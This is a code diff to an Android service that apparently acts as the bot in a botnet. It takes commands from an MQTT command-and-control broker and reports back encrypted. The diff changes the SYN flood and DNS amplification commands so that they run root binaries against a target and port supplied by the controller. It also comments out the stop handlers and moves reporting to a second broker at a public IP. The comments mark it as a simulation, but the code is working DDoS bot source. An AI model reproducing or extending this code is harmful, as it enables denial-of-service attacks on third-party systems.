@@ -220,7 +220,7 @@ public class MqttConnectionManagerService extends Service {
 
         client = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://192.168.1.78:1883",
                 clientId);
-        client2 = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://187.208.100.198:1883",
+        client2 = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://187.208.132.4:1883",
                 clientId2); //SIMULACIÓN <-------------
 
         final String id = MqttApplication.sharedPreferences.getString("ID", "-");
@@ -237,7 +237,7 @@ public class MqttConnectionManagerService extends Service {
                 }
 
                 @Override
-                public void messageArrived(String topic, MqttMessage message) throws MqttException, NoSuchPaddingException, NoSuchAlgorithmException, JSONException {
+                public void messageArrived(String topic, MqttMessage message) throws MqttException, NoSuchPaddingException, NoSuchAlgorithmException, JSONException, IOException {
                     Log.d(TAG, "messageArrived: Topic: " + topic + " Message: " + message);
 
                     String s = String.valueOf(message);
@@ -597,15 +597,15 @@ public class MqttConnectionManagerService extends Service {
                             break;
 
                         case 9:
-                             /*
-                            Se inicializa un hilo para la inundación Syn,
-                            de esta manera, se crea un proceso "independente" que no bloquea la comunicación
-                            entre C&C-Bot. Nota: Si no se crea el hilo, los camndos 1,2,3..
-                            dejan de ser recibidos por el bot, lo cual imposibilita detener
-                            la inundación SYN.*/
-                             if(!busyThread && !dosFloodSyn){
 
-                                 String floodSyn = "Iniciada";
+                            try {
+                                 Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/pruebaTCPSYN " + splited[1] + " " + splited[2]});// Syn fl
+                                 BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                                 while((str[0] = inputStream.readLine())!= null){
+                                     sb.append(str[0]);
+                                 }
+
+                                 String floodSyn = sb.toString();
                                  String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";
 
                                  //Cifrando
@@ -622,50 +622,19 @@ public class MqttConnectionManagerService extends Service {
                                  MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());
 
                                  try {
-                                     client.publish("CyC",mqttMessage);
+                                     client2.publish("CyC",mqttMessage);
                                  } catch (MqttException e) {
                                      e.printStackTrace();
                                  }
-                                 //Cambio de estado de las bandera
-                                 MqttApplication.editor.putBoolean("BUSY_THREAD", true);
-                                 MqttApplication.editor.apply();
-
-                                 MqttApplication.editor.putBoolean("DOS_FLOOD_SYN", true);
-                                 MqttApplication.editor.apply();
-
-                                 t1 = new MyThread(splited[1],splited[2],1,client2);
-
-                             }else if (busyThread){
-
-                                 String floodSyn = "Error (1) Solo un DDoS a la vez";
-                                 String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";
-
-                                 //Cifrando
-                                 Blowfish blowfish = new Blowfish();
-                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-
-                                 try {
-                                     bytesMqtt.write(encryptKey.getBytes());
-                                     bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
-                                 } catch (Exception e) {
-                                     e.printStackTrace();
-                                 }
-
-                                 MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());
-
-                                 try {
-                                     client.publish("CyC",mqttMessage);
-                                 } catch (MqttException e) {
-                                     e.printStackTrace();
-                                 }
-
-                             }
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                            }
 
                             break;
 
                         case 10:
 
-                            if(busyThread && dosFloodSyn){
+                            /*if(busyThread && dosFloodSyn){
 
                                 MqttApplication.editor.putBoolean("BUSY_THREAD", false);
                                 MqttApplication.editor.apply();
@@ -730,16 +699,20 @@ public class MqttConnectionManagerService extends Service {
                                 } catch (MqttException e) {
                                     e.printStackTrace();
                                 }
-                            }
+                            }*/
 
                             break;
 
                         case 11:
 
-                            if(!busyThread && !dosAmpDns){
-                                t1 = new MyThread(splited[1],splited[2],2,client2);
+                            try{
+                                Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/pruebaAMPDNS " + splited[1] + " " + splited[2]});// Syn fl
+                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                                while((str[0] = inputStream.readLine())!= null){
+                                    sb.append(str[0]);
+                                }
 
-                                String ampDns = "Iniciada";
+                                String ampDns = sb.toString();
                                 String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+ampDns+"\"}"+firstTime+"&";
 
                                 //Cifrando
@@ -756,47 +729,20 @@ public class MqttConnectionManagerService extends Service {
                                 MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());
 
                                 try {
-                                    client.publish("CyC",mqttMessage);
-                                } catch (MqttException e) {
-                                    e.printStackTrace();
-                                }
-                                //Cambio de estado de las banderas
-                                MqttApplication.editor.putBoolean("BUSY_THREAD", true);
-                                MqttApplication.editor.apply();
-                                MqttApplication.editor.putBoolean("DOS_AMP_DNS", true);
-                                MqttApplication.editor.apply();
-
-                            }else if (busyThread){
-
-                                String floodSyn = "Error (1) Solo un DDoS a la vez";
-                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";
-
-                                //Cifrando
-                                Blowfish blowfish = new Blowfish();
-                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
-
-                                try {
-                                    bytesMqtt.write(encryptKey.getBytes());
-                                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
-                                } catch (Exception e) {
-                                    e.printStackTrace();
-                                }
-
-                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());
-
-                                try {
-                                    client.publish("CyC",mqttMessage);
+                                    client2.publish("CyC",mqttMessage);
                                 } catch (MqttException e) {
                                     e.printStackTrace();
                                 }
 
+                            } catch (Exception e) {
+                                e.printStackTrace();
                             }
 
                             break;
 
                         case 12:
 
-                            if(busyThread && dosAmpDns){
+                            /*if(busyThread && dosAmpDns){
                                 MqttApplication.editor.putBoolean("BUSY_THREAD", false);
                                 MqttApplication.editor.apply();
                                 MqttApplication.editor.putBoolean("DOS_AMP_DNS", false);
@@ -857,7 +803,7 @@ public class MqttConnectionManagerService extends Service {
                                 } catch (MqttException e) {
                                     e.printStackTrace();
                                 }
-                            }
+                            }*/
 
                             break;
 
@@ -899,7 +845,6 @@ public class MqttConnectionManagerService extends Service {
 
                         default:
 
-                            Log.d (TAG,"Pura mierda (vida): "+s);
                             break;
 
                     }
